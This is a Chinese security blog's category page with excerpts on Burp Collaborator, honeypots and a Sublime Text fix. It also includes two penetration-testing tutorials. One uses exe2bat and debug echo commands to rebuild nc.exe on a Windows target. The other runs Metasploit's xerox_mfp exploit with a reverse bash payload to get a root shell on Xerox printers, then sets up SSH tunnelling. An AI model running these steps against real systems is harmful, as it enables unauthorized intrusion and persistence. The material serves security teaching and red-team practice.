<!DOCTYPE html>
<html>

<head>
  <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
  <title>Category: 黑客技巧 | Blog of Secer</title>
  <meta name="description" content="" />
  <meta name="HandheldFriendly" content="True" />
  <meta name="MobileOptimized" content="320" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <link rel="stylesheet" type="text/css" href="/css/screen.css" />
  <link rel="stylesheet" type="text/css" href="/css/style.css" />
  <meta name="generator" content="Blog of Secer">

  
  
  

  
</head>

<!--
<body class="home-template">
-->
<body class="home-template">
<div id="perspective" class="perspective effect-movedown">
  <div class="container">
    <!-- wrapper -->
    <div class="wrapper">

      <header class="site-head"  style="background: #24282b url(/img/img-bg.jpg) 0 -20%" >
    <div class="vertical">
        <div class="site-head-content inner">
             <a class="blog-logo" href="/"><img src="/img/logo.svg" alt="Blog Logo"/></a> 
            <h1 class="blog-title">Blog of Secer</h1>
            <h2 class="blog-description"><button id="showMenu">Show Menu</button></h2>
        </div>
    </div>
</header>

      
<main class="content" role="main">
  
  <article class="post">
    <header class="post-header">
      <span class="post-meta">
      <time datetime="2016-07-30T01:42:15.000Z" itemprop="datePublished">
          2016-07-30
      </time>
    
    
    | 
    <a href='/tag/xss/'>xss</a>,
    
    <a href='/tag/burpsuite/'>burpsuite</a>,
    
    <a href='/tag/SSRF/'>SSRF</a>
    
    
</span>
      <h2 class="post-title"><a href="/1145.seo/">Burpsuite之Burp Collaborator模块介绍</a></h2>
    </header>
    <section class="post-excerpt">
      <p>
      
        <p><b>Burp Collaborator.</b><b>是从</b><b>Burp suite v1.6.15</b><b>版本添加的新功能，它几乎是一种全新的渗透测试方法。</b><b><a href="http://ha.cker.in/tag/BurpSuite" target="_blank">Burp</a> Collaborator.</b><b>会渐渐支持</b><b>blind <a href="http://ha.cker.in/tag/xss" target="_blank">XSS</a></b><b>，</b><b>SSRF</b><b>，</b><b> asynchronous code injection</b><b>等其他还未分类的漏洞类型。</b><b></b></p>  <p>本文主要介绍使用Burp Collaborator.对这几种类型漏洞进行探测。</p>  <p><b>概念：</b><b>In-band attack</b><b>与</b><b> out-band attack</b><b>（带内与带外攻击）</b><b></b></p>  <p>首先介绍两个概念，带内与带外的区别核心在于是否使用不同的通信通道。</p>  <p>在一次攻击当中,只有一条通道，属于in-band（带内）攻击：</p>  <p><a href="https://static-js.b0.upaiyun.com/wp-content/uploads/2016/07/31.png"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/BurpsuiteBurpCollaborator_F875/clip_image001.png" width="657" height="133" /></a></p>  <p>现在同一次攻击下，不止一条信道，则属于out-band（带外）攻击：</p>  <p><a href="https://static-js.b0.upaiyun.com/wp-content/uploads/2016/07/222.png"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/BurpsuiteBurpCollaborator_F875/clip_image002.png" width="656" height="391" /></a></p>  <p><b>常规</b><b>web</b><b>测试模型</b><b></b></p>  <p>简单的讲，常规的web测试模型就是我们向目标发送payloads，然后分析目标返回的数据。</p>  <p><a href="https://static-js.b0.upaiyun.com/wp-content/uploads/2016/07/33.png"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image003" border="0" alt="clip_image003" src="http://img.cker.in/BurpsuiteBurpCollaborator_F875/clip_image003.png" width="554" height="115" /></a></p>  <p>这个模型很容易建立并且容易理解，但是这个简单的模型漏掉很多bugs，比如：</p>  <p>§ “super-blind” injection。”blind SQL injection”表示当一个payload破坏了正常的sql查询然而应用程序返回的内容没有任何有帮助的错误信息。但是在有些情况下，一个成功的注入在目标应用的返回里面是完全看不到区别的，意思就是，不论返回的内容还是返回的时间，都没有任何区别。举个例子，注入asynchronous logging function就是一个典型的情况</p>  <p>§ 需要存储数据的情况。比如存储型xss理论上通过先提交payloads然后观察返回值是可以发现的。但是其他的存储型bugs很难发现，比如，stored (or second-order) SQL injection,数据先是以安全的方式存储在数据库中，然后再从数据库取出再拼接sql语句。要使用常规渗透模型发现这种漏洞，我们需要爆破每一种请求的组合，要先发送第一个request请求，然后在发送第二个request请求，然后观察返回值。</p>  <p>§ 我们还会漏掉一种漏洞，一次成功的攻击只发生在应用内部，对攻击者是不可见的。比如，存储型xss攻击成功要求管理员访问管理地址。</p>  <p>§ 还有很多涉及到内部系统与外部资源交互的情况，比如SSRF和RFI等漏洞。</p>  <p><b>加入</b><b>Burp Collaborator</b><b>后的</b><b>web</b><b>测试模型</b><b></b></p>  <p>Burp Collaborator 给传统web测试模型添加了一个新的部分，Burp Collaborator的功能有：</p>  <p>§ 捕捉由Burp发出的payloads触发的目标与外部系统发生数据交互行为</p>  <p>§ 把Burp Collaborator与目标数据交互行为产生的返回数据传回攻击者</p>  <p>§ 对很多新型漏洞进行可靠的探测。 <a href="https://static-js.b0.upaiyun.com/wp-content/uploads/2016/07/341.png"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image004" border="0" alt="clip_image004" src="http://img.cker.in/BurpsuiteBurpCollaborator_F875/clip_image004.png" width="554" height="295" /></a></p>  <p>Burp Collaborator模块包含如下特征：</p>  <p>§ Burp Collaborator 服务器通常运行在公网上。</p>  <p>§ 它使用自己的专用域名，并且这个服务器已注册为该域名的权威DNS服务器。</p>  <p>§ 它提供一个DNS服务，可以响应任何对他的dns请求</p>  <p>§ 它提供HTTP/HTTPS 服务，使用一个有效的SSL证书</p>  <p>§ 将来可以添加其他的服务，比如smtp和ftp。</p>  <p><b>探测</b><b>external service interaction</b><b>（外部服务交互攻击）</b><b></b></p>  <p>与外部服务交互行为发生在一个payload提交到目标应用上，导致目标通过某个网络协议和一个外部的域名进行信息交互。</p>  <p><a href="https://static-js.b0.upaiyun.com/wp-content/uploads/2016/07/35.png"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image005" border="0" alt="clip_image005" src="http://img.cker.in/BurpsuiteBurpCollaborator_F875/clip_image005.png" width="554" height="373" /></a></p>  <p>这种行为有时候被称为<a href="http://ha.cker.in/tag/SSRF" target="_blank">SSRF</a>，我们更偏向于称之为外部服务交互（”external service interaction”）攻击，因为这种情况里面，很多行为不仅仅通过HTTP协议触发，还有SMB或者FTP等。</p>  <p>外部服务交互可以代表一个严重的漏洞，因为他可以允许应用服务器作为一个代理来攻击其他的服务器。这包裹公网上面的第三方系统，同一个组织下的内部系统或者监听在本地的服务。根据网络结构，这可以将内部容易被攻击的系统暴露给外部的攻击者。</p><br>
      
      </p>
      
      <p>
          <a href="/1145.seo/" class="excerpt-link">Read More...</a>
      </p>
      
    </section>
  </article>
  
  <article class="post">
    <header class="post-header">
      <span class="post-meta">
      <time datetime="2016-07-20T09:22:37.000Z" itemprop="datePublished">
          2016-07-20
      </time>
    
    
    | 
    <a href='/tag/APT/'>APT</a>,
    
    <a href='/tag/蜜罐/'>蜜罐</a>,
    
    <a href='/tag/Honeypot/'>Honeypot</a>
    
    
</span>
      <h2 class="post-title"><a href="/1140.seo/">为什么这么多创业公司都在做"蜜罐"？也许这篇文章能告诉你</a></h2>
    </header>
    <section class="post-excerpt">
      <p>
      
        <p><h4>前言</h4>  <p>信息安全发展到了今天繁荣的程度，传统的安全还是靠静态的特征码的方式来识别攻击，但是伴随着新型的APT攻击的出现，很多企业才意识到传统安全技术手段已经无法满足对内部威胁的及时发现，于是，很多传统的安全公司大佬都开始转战使用动态沙箱技术来解决问题，有卖设备型的例如Symantec ATP硬件配合终端的SEP构成、有360安全卫士联动威胁情报的方式，来探测未知威胁，当然这种方式主要是针对<a href="http://ha.cker.in/tag/APT" target="_blank">APT</a>攻击的第一个环节，你黑客通过社会工程学的手段得到用户的信息，使用网络钓鱼或者水坑攻击的方式进入企业内网个人PC。但是要拿到有价值的内部敏感信息，黑客需要进一步部署攻击链，包括获取凭证、内网资产扫描等探测工作，因为很多行业包括金融机构是不允许在业务服务器上安装安全解决方案的，甚至配置日志系统都不可以，那么，目前部署蜜罐是最好的解决方案了。</p>  <p><b>那么研究蜜罐解决方案，我们目前更关注的有以下几个方面：</b></p>  <p>开源蜜罐和商业蜜罐区别？</p>  <p>到底蜜罐是否需要大数据分析（机器学习算法）？</p>  <p>蜜罐创业商业模式如何？</p>  <h4>现有产品分析</h4>  <p>本节介绍包括开源蜜罐分析和国内外商业蜜罐分析。</p>  <p><b>开源蜜罐按照类型可以划分为以下几种：</b></p>  <h5>数据库蜜罐（典型案例：ElasticSearch <a href="http://ha.cker.in/tag/Honeypot" target="_blank">Honeypot</a>）</h5>  <p>ElasticSearch <a href="http://ha.cker.in/tag/Honeypot" target="_blank">Honeypot</a>：看了一下源码，发现是使用go语言实现的几个fake函数</p>  <p>Fake banner：访问根目录时候，返回函数</p>  <p>FakeNodes：访问/Nodes目录时候，返回函数</p>  <p>FakeSearch：访问/Search目录时候，返回函数</p>  <p>hpfeedsConnect：使用hpfeed协议通讯</p>  <p>发现都是伪造的函数返回，这样很有可能被入侵者发现是蜜罐，所以建议使用原始软件版本加patch的方式完成蜜罐记录功能，当然研发投入也比较大。个人建议模拟以下Elastic search漏洞：   <table border="0" cellspacing="0" cellpadding="0"><tbody>       <tr>         <td valign="top">           <p><b>ESA ID </b><b></b></p>         </td>          <td valign="top">           <p><b>CVE Link </b><b></b></p>         </td>          <td valign="top">           <p><b>Vulnerability Summary </b><b></b></p>         </td>       </tr>        <tr>         <td valign="top">           <p>ESA-2015-08 </p>         </td>          <td valign="top">           <p>CVE-2015-5531 </p>         </td>          <td valign="top">           <p>Elasticsearch versions from 1.0.0 to 1.6.0 are vulnerable to a directory traversal attack. </p>         </td>       </tr>        <tr>         <td valign="top">           <p>ESA-2015-06 </p>         </td>          <td valign="top">           <p>CVE-2015-5377 </p>         </td>          <td valign="top">           <p>Elasticsearch versions prior to 1.6.1 are vulnerable to an attack that can result in remote code execution. </p>         </td>       </tr>        <tr>         <td valign="top">           <p>ESA-2015-05 </p>         </td>          <td valign="top">           <p>CVE-2015-4165 </p>         </td>          <td valign="top">           <p>All Elasticsearch versions from 1.0.0 to 1.5.2 are vulnerable to an attack that uses Elasticsearch to modify files read and executed by certain other applications. </p>         </td>       </tr>        <tr>         <td valign="top">           <p>ESA-2015-02 </p>         </td>          <td valign="top">           <p>CVE-2015-3337 </p>         </td>          <td valign="top">           <p>All Elasticsearch versions prior to 1.5.2 and 1.4.5 are vulnerable to a directory traversal attack that allows an attacker to retrieve files from the server running Elasticsearch when one or more site plugins are installed, or when Windows is the server OS. </p>         </td>       </tr>     </tbody></table> </p>  <p>拿漏洞ESA-2015-08目录列举漏洞举例子，创建仓库，elasticsearch 解析出现了异常，并返回了读取文件的内容，以后都是读取的/etc/passwd 文件的内容。那么这个蜜罐怎么做呢？应该把文件变更记录做好，然后使用原始版本以patch的方式记录登录、RESTful API提交记录，这个使用真实服务模拟的研发投入也比较大。</p>  <h5>Web蜜罐（典型案例：Glastopf）</h5>  <p>漏洞类型仿真</p>  <p>未知的攻击</p>  <p>支持多种数据库类型</p>  <p>HPFeeds通讯</p>  <p>过内置的沙箱PHP远程文件包含，本地文件包含通过POST请求</p>  <p>通常对手使用搜索引擎和特殊制作的搜索请求找到他们的受害者</p>  <p>模拟SQL注入、爬虫响应等。</p>  <p>如果要是我做，还是要结合WAF精细化攻击数据。因为正常和不正常的URL访问太多。</p>  <h5>服务蜜罐（典型案例Kippo）</h5>  <p>伪装文件系统</p>  <p>• 伪装用户文件存储</p>  <p>•&#160;&#160;&#160; Sftp子文件系统 上传文件存储</p>  <p>• 模拟一些特殊的黑客关心的文件/etc/passwd</p>  <p>伪造系统命令</p>  <p>• 文件上传下载命令 sftp、scp，同时支持客户端wget/curl命令解析</p>  <p>•&#160;&#160;&#160; SSH交互执行的命令(黑客入侵常用命令)：w\exit\cat\uname\chmod\ps\cd</p>  <p>伪装系统相关配置</p>  <p>•&#160;&#160;&#160; Hostname</p>  <p>•&#160;&#160;&#160; SSH服务指纹</p>  <p>•&#160;&#160;&#160; SSH账号和密码</p>  <p>•&#160;&#160;&#160; SSH key</p>  <p>与外部威胁情报联动</p>  <p>• 连接IP白名单威胁情报</p>  <p>• 上传可疑文件内容检查威胁情报</p>  <p>日志大数据处理</p>  <p>• 支持elastic search日志导出</p>  <p> SSH蜜罐目前开源解决方案比较成熟，但是还是缺乏BASH内部命令审计和文件变更审计。。。。</p>  <h5>工控蜜罐</h5>  <p>这个不在我们讨论的范围，工控有致命的弱点，通讯协议本身没有加密，Wireshark完全透视，我觉得，还是把工控防火墙做好，然后再想蜜罐的事吧。</p>  <h5>其它蜜罐（典型案例：RDPY）</h5>  <p>RDPY：RDPY是基于Twisted Python实现的微软RDP远程桌面协议。RDPY支持标准的RDP安全协议，通过SSL或者NLA加密验证（或者通过nltmv2验证协议）其子项目rdpy-rdphoneypot是一个基于RDP的蜜罐。使用会话场景记录并通过RDP协议来重放会话场景。</p><br>
      
      </p>
      
      <p>
          <a href="/1140.seo/" class="excerpt-link">Read More...</a>
      </p>
      
    </section>
  </article>
  
  <article class="post">
    <header class="post-header">
      <span class="post-meta">
      <time datetime="2016-04-07T18:44:39.000Z" itemprop="datePublished">
          2016-04-08
      </time>
    
</span>
      <h2 class="post-title"><a href="/1136.seo/">特殊条件数据传输</a></h2>
    </header>
    <section class="post-excerpt">
      <p>
      
        0x00 借问酒家    有什么东西想拿却拿不出来？不妨开开脑洞。    缘起是2014年底的时候看到金山做的在线恶意代码分析系统“Fire eye”（https://fireeye.ijinshan.com/）。感觉很新鲜，丢了自己攒的几个样本丢了上去，分析的结果还算可以。从分析报告来看，它也是一类沙箱检测工具，把样本丢到虚拟机里跑，再在虚拟机内外布控，监测样本的各种行为，最后生成分析报告并给出判断是否恶意样本，分析报告里还包含样本运
      
      </p>
      
      <p>
          <a href="/1136.seo/" class="excerpt-link">Read More...</a>
      </p>
      
    </section>
  </article>
  
  <article class="post">
    <header class="post-header">
      <span class="post-meta">
      <time datetime="2016-04-05T00:31:06.000Z" itemprop="datePublished">
          2016-04-05
      </time>
    
    
    | 
    <a href='/tag/渗透测试/'>渗透测试</a>
    
    
</span>
      <h2 class="post-title"><a href="/1134.seo/">渗透测试中上传文件到目标系统的四种姿势</a></h2>
    </header>
    <section class="post-excerpt">
      <p>
      
        <p>&#160;</p>  <p><b>#Windows </b><b>的 debug 方法</b></p>  <p>Windows 有一个程序叫 debug，这个程序可以将十六进制的机器码转换为可执行的文件。Windows 的 debug 方法可以先将文件转化为十六进制，然后通过非交互式 shell 在目标系统上 echo 出这个文件，最后使用 debug 转换十六进制并执行。Kali 里有一个名为 exe2bat 的程序位于 /usr/share/windows-binaries。</p>  <p>我们可以这样运行</p>  <p>root@kali:/usr/share/windows-binaries# wine exe2bat.exe nc.exe nc2.txt</p>  <p>Finished: nc.exe &gt; nc2.txt</p>  <p>root@kali:/usr/share/windows-binaries#</p>  <p>这条命令会生成一个 txt 文档，其中内容类似如下：</p>  <p>echo 6e 76 69 72 6f 6e 6d 65 6e 74 53 74 72 69 6e 67 73 57 00 00 a3 00 47 65 74 43 50 49 6e 66 6f 00 9d 00 47 65 74 41 43 50 00 00 09 01 47 65 74 4f 45 4d 43 50 00 00 1e 00 43 6f 6d 70 61 72 65 53 74 72 69 6e 6$</p>  <p>echo e e780 &gt;&gt;123.hex</p>  <p>echo 6c 65 00 00 19 02 53 65 74 46 69 6c 65 50 6f 69 6e 74 65 72 00 00 2b 01 47 65 74 53 74 72 69 6e 67 54 79 70 65 41 00 00 2e 01 47 65 74 53 74 72 69 6e 67 54 79 70 65 57 00 00 16 01 47 65 74 50 72 6f 63 41 6$</p>  <p>echo e e800 &gt;&gt;123.hex</p>  <p>echo 47 65 74 4e 75 6d 62 65 72 4f 66 43 6f 6e 73 6f 6c 65 49 6e 70 75 74 45 76 65 6e 74 73 00 31 00 43 72 65 61 74 65 46 69 6c 65 41 00 10 02 53 65 74 45 6e 64 4f 66 46 69 6c 65 00 00 8d 01 4c 43 4d 61 70 53 7$</p>  <p>echo e e880 &gt;&gt;123.hex</p>  <p>echo 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0$</p>  <p>echo e e900 &gt;&gt;123.hex</p>  <p>echo &gt;&gt;123.hex</p>  <p>echo r cx &gt;&gt;123.hex</p>  <p>echo e800 &gt;&gt;123.hex</p>  <p>echo w &gt;&gt;123.hex</p>  <p>echo q &gt;&gt;123.hex</p>  <p>debug&lt;123.hex</p>  <p>copy 1.dll nc.exe</p>  <p>之后我们要做的就是复制文档中所有的内容，粘贴到 Shell 窗口内即可。</p>  <p>0<b>C96</b>:E8E0 00.00 00.00 00.00 00.00 00.00 00.00 00.00 00.00</p>  <p>0<b>C96</b>:E8E8 00.00 00.00 00.00 00.00 00.00 00.00 00.00 00.00</p>  <p>0<b>C96</b>:E8F0 00.00 00.00 00.00 00.00 00.00 00.00 00.00 00.00</p>  <p>0<b>C96</b>:E8F8 00.00 00.00 00.00 00.00 00.00 00.00 00.00 00.00</p>  <p>0<b>C96</b>:E900 <b>EC</b>. 0<b>E</b>. <b>AC</b>.</p>  <p><b>-e</b> <b>e900</b></p>  <p>0<b>C96</b>:E900 <b>EC</b>.</p>  <p><b>EC</b> 0<b>E</b>.e <b>AC</b>.ac</p>  <p><b>-r</b> <b>cx</b></p>  <p><b>CX</b> 0000</p>  <p>:e800</p>  <p><b>-w</b></p>  <p><b>Writing</b> 0<b>E800</b> <b>bytes</b></p>  <p><b>-q</b></p>  <p><b>C</b>:\<b>TRANSF</b>~1&gt;</p>  <p>这样我们的文件就出现在远程的目录里了。</p>  <p>21/10/2015 22:44 &lt;DIR&gt; .</p>  <p>21/10/2015 22:44 &lt;DIR&gt; ..</p>  <p>21/10/2015 22:44 59.392 1.DLL</p>  <p>21/10/2015 22:44 184.270 123.hex</p>  <p>21/10/2015 22:44 59.392 nc.exe</p><br>
      
      </p>
      
      <p>
          <a href="/1134.seo/" class="excerpt-link">Read More...</a>
      </p>
      
    </section>
  </article>
  
  <article class="post">
    <header class="post-header">
      <span class="post-meta">
      <time datetime="2016-01-11T18:28:55.000Z" itemprop="datePublished">
          2016-01-12
      </time>
    
    
    | 
    <a href='/tag/APT/'>APT</a>,
    
    <a href='/tag/Metasploit/'>Metasploit</a>,
    
    <a href='/tag/MFP/'>MFP</a>,
    
    <a href='/tag/LDAP/'>LDAP</a>
    
    
</span>
      <h2 class="post-title"><a href="/1133.seo/">针对打印机的APT攻击</a></h2>
    </header>
    <section class="post-excerpt">
      <p>
      
        <p><b>一直以来我们都在讨论多功能打印机（MFP）在企业环境下所带来的风险，以及攻击者如何轻易的利用其来进行恶意攻击，比如通过<a href="http://ha.cker.in/tag/LDAP" target="_blank">LDAP</a>提取Windows Active Directory的证书或者滥用“扫描文件”和“扫描电子邮件”功能。</b></p>  <p>而在最近一次我们的攻防演练中，在通过MFP设备攻击Windows Active Directory时，我们利用该设备隐藏了我们的位置，这使得针对MFP设备的攻击进入了新的阶段。在本文中我们就来分享一下如何利用被盗用的Xerox Workcentre MFP设备来进行<a href="http://ha.cker.in/tag/APT" target="_blank">APT</a>的细节。</p>  <p><a href="http://img.cker.in/APT_8EB4/clip_image001.png"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/APT_8EB4/clip_image001_thumb.png" width="787" height="398" /></a></p>  <p>首先我们要确定该Xerox Workcentre MFP设备在已经被入侵的网络中很容易受到固件注入攻击。实际上该技术早在2012年就已经被发表了，但由于缺乏对这一类物联网设备的强制性更新，目前仍有大量的Xerox Workcentre <a href="http://ha.cker.in/tag/MFP" target="_blank">MFP</a>设备会受到这种攻击，这一点可以很容易的通过<a href="http://ha.cker.in/tag/metasploit" target="_blank">Metasploit</a>中的xerox_mfp模块来进行验证。而如果设备并不容易遭受攻击，或者攻击的结果只能够进行打印等操作，那显然是毫无价值的。但是如果它存在严重漏洞可以使你获得反向shell并最终拿到该设备的Root权限，那就相当的有价值了。</p>  <p><b>以下将向您展示通过<a href="http://ha.cker.in/tag/metasploit" target="_blank">Metasploit</a>中的xerox_mfp模块来实施此类攻击。</b></p>  <p>[1]在Metasploit中选择 xerox_mfp 模块：</p>  <p>Use exploit/unix/misc/xerox_mfp</p>  <p>（<a href="http://www.rapid7.com/db/modules/exploit/unix/misc/xerox_mfp）">http://www.rapid7.com/db/modules/exploit/unix/misc/xerox_mfp）</a></p>  <p>[2]接下来选择反向 bash payload 模块并使用它：</p>  <p>Set payload cmd/unix/reverse_bash</p>  <p>[3]最后使用以下命令设置目标IP和本地IP:</p>  <p>set RHOST ipaddress</p>  <p>set LHOST ipaddress</p>  <p>[4]这里建议你设置 wfsdelay 到30，因为当你在进行攻击时打印机有可能进入睡眠模式，这样做可以在你等待会话连接到监听器时增加延时。</p>  <p>set wfsdelay 30</p>  <p>[5]一旦完成上面的操作，你就可以通过输入或者运行exploit来启动exploit。</p>  <p>Xerox exploit将会启动固件注入攻击并返回一个可以接入MFP root权限的远程shell。</p>  <p>如下图所示：</p>  <p><a href="http://img.cker.in/APT_8EB4/clip_image002.png"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/APT_8EB4/clip_image002_thumb.png" width="699" height="635" /></a></p>  <p><b>建立并启用SSHD</b></p>  <p>当你获得了该MFP设备的root访问权限后，需要进行一些必要的配置，以便能够启用SSH隧道。第一步是建立SSH主机密钥，使你可以启动MFP设备上的SSH进程。</p>  <p><b>具体步骤如下：</b></p>  <p>输入以下命令来生成dsa和rsa密钥对：</p>  <p>ssh-keygen -t dsa -f /etc/ssh/ssh_host_dsa_key</p>  <p>ssh-keygen -t rsa -f /etc/ssh/ssh_host_rsa_key</p>  <p>当有提示要输入密码时直接回车，下图是生成密钥的一个例子：</p>  <p><a href="http://img.cker.in/APT_8EB4/clip_image003.png"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image003" border="0" alt="clip_image003" src="http://img.cker.in/APT_8EB4/clip_image003_thumb.png" width="736" height="372" /></a></p>  <p></p><br>
      
      </p>
      
      <p>
          <a href="/1133.seo/" class="excerpt-link">Read More...</a>
      </p>
      
    </section>
  </article>
  
  <article class="post">
    <header class="post-header">
      <span class="post-meta">
      <time datetime="2015-07-30T07:28:32.000Z" itemprop="datePublished">
          2015-07-30
      </time>
    
    
    | 
    <a href='/tag/Sublime/'>Sublime</a>
    
    
</span>
      <h2 class="post-title"><a href="/1126.seo/">Mac下Sublime Text 2 3总是以新窗口打开文件的解决办法</a></h2>
    </header>
    <section class="post-excerpt">
      <p>
      
        Windows/Linux下的Sublime总是默认的以标签页的形式打开关联的文件，但是在Mac下使用Sublime打开文件，总是使用新窗口。    不用多久，就有了一堆Sublime的窗口，找东西很麻烦。    解决办法如下：    sublime text 2.x：   具体设置：Preferences -&gt; Settings – Default -&gt; 搜索open_files_in_new_window，将其true 
      
      </p>
      
      <p>
          <a href="/1126.seo/" class="excerpt-link">Read More...</a>
      </p>
      
    </section>
  </article>
  
  <nav class="pagination" role="pagination">
    
    <span class="page-number">Page 1 of 10</span>
    <a class="older-posts" href="/category/黑客技巧/page/2/">Older Posts →</a>
  </nav>
</main>


      
<footer class="site-footer">
  
  <div class="inner">
     <section class="copyright">All content copyright <a href="/">Blog of Secer</a> &copy; 2014 &bull; All rights reserved.</section>
     <section class="poweredby">Proudly published with <a class="icon-ghost" href="http://zespia.tw/hexo/">Hexo</a></section>
  </div>
</footer>

      <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>

<script type="text/javascript" src="/js/jquery.fitvids.js"></script>
<script type="text/javascript" src="/js/index.js"></script>
<script type="text/javascript" src="/js/menu.js"></script>





  </div>
</div>

<nav  class="outer-nav top horizontal">

          <a class="icon-home"  href="/"><span>Home</span></a>

          <a class="icon-news"  href="/archive"><span>Archive</span></a>

          <a class="icon-image"  href="/images"><span>Images</span></a>

          <a class="icon-wiki"  href="/wiki/2014-10-28-wiki/"><span>Wiki</span></a>

          <a class="icon-Favorites"  href="/favorites"><span>Favorites</span></a>

          <a class="icon-mail"  href="/about/2014-09-11-mabao/"><span>Contact</span></a>

</nav>

</div>
</body>
</html>
